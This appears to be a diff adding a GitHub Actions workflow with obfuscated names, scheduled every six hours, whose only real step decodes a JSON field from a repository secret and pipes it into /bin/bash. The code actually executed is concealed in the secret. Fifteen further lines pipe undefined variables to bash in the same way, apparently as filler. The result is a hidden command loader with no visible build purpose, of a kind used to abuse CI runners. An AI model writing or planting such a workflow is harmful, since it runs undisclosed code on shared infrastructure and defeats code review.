@@ -1,0 +1,32 @@
+name: buzhigairuhexuanzee
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: buzhigairuhexuanzee
+        env:
+          zqzzu08856: ${{ secrets.zqzzu08856 }}
+        run: |
+          echo $zqzzu08856 | jq -r .lkuv56075 | /bin/bash
+          echo $tw07466 | jq -r .oeakz21 | /bin/bash
+          echo $krui80 | jq -r .mcdsv6 | /bin/bash
+          echo $ixzz28 | jq -r .l1635 | /bin/bash
+          echo $zl1 | jq -r .pg3 | /bin/bash
+          echo $rpmx54812 | jq -r .ob77 | /bin/bash
+          echo $mla11 | jq -r .fyhs681 | /bin/bash
+          echo $gdobj7 | jq -r .ry6 | /bin/bash
+          echo $e12942 | jq -r .yjkd90 | /bin/bash
+          echo $kaw63 | jq -r .r3 | /bin/bash
+          echo $oeln47 | jq -r .vyjj69549 | /bin/bash
+          echo $nlrz0282 | jq -r .zld93 | /bin/bash
+          echo $jzeiq42823 | jq -r .tsnp660 | /bin/bash
+          echo $ge68903 | jq -r .po20 | /bin/bash
+          echo $fsey0 | jq -r .jjv84320 | /bin/bash
+          echo $e70 | jq -r .vz90726 | /bin/bash
+
